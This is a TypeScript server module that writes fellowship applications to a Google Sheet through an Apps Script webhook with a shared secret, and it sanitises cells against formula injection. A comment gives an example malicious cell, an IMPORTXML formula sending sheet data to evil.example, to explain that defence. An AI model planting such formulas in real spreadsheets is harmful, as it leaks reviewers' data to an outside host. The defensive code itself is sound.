/**
 * Appending fellowship applications to the review Google Sheet.
 *
 * The Sheet is written through a small Apps Script web app bound to it
 * (google-apps-script/fellowship-sheet.gs), not the Sheets API: no Google
 * Cloud project, no service-account key to rotate. The script is reachable
 * by anyone who has its URL, so every request carries a shared secret that
 * the script checks before writing. Both values live only in server env.
 *
 * Server-only. Never import this from a client component.
 */

const TIMEOUT_MS = 10_000

/**
 * Applicant text is untrusted. In Google Sheets a cell that starts with
 * = + - or @ is evaluated as a formula, so an answer like
 * =IMPORTXML("https://evil.example/?"&A2, "//x") would run inside the review
 * sheet with the reviewer's access. A leading apostrophe forces plain text
 * and is not displayed. Tab and carriage return are on the list because
 * spreadsheet tools have treated them as formula prefixes too.
 */
export function toSafeCell(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value
}

export interface SheetConfig {
  webhookUrl: string
  secret: string
}

export function sheetConfigFromEnv(): SheetConfig | null {
  const webhookUrl = process.env.FELLOWSHIP_SHEET_WEBHOOK_URL
  const secret = process.env.FELLOWSHIP_SHEET_SECRET
  if (!webhookUrl || !secret) return null
  return { webhookUrl, secret }
}

interface ScriptResponse {
  ok?: boolean
  error?: string
}

/** Append one row. Throws with a reason if the row was not written. */
export async function appendSheetRow(
  config: SheetConfig,
  headers: readonly string[],
  row: readonly string[],
): Promise<void> {
  if (headers.length !== row.length) {
    throw new Error(`Sheet row has ${row.length} cells for ${headers.length} headers`)
  }

  /* Apps Script answers a POST with a 302 to googleusercontent.com, where the
     script's output is served. fetch follows it as a GET, which is what the
     redirect expects; the write has already happened on the POST. */
  const res = await fetch(config.webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      secret: config.secret,
      headers,
      row: row.map(toSafeCell),
    }),
    signal: AbortSignal.timeout(TIMEOUT_MS),
  })

  if (!res.ok) throw new Error(`Sheet webhook returned HTTP ${res.status}`)

  let body: ScriptResponse
  try {
    body = (await res.json()) as ScriptResponse
  } catch {
    /* An HTML page here almost always means the web app is not deployed with
       access set to "Anyone", so Google served a sign-in page instead. */
    throw new Error('Sheet webhook did not return JSON — check the Apps Script deployment access')
  }
  if (!body.ok) throw new Error(`Sheet webhook refused the row: ${body.error ?? 'no reason given'}`)
}
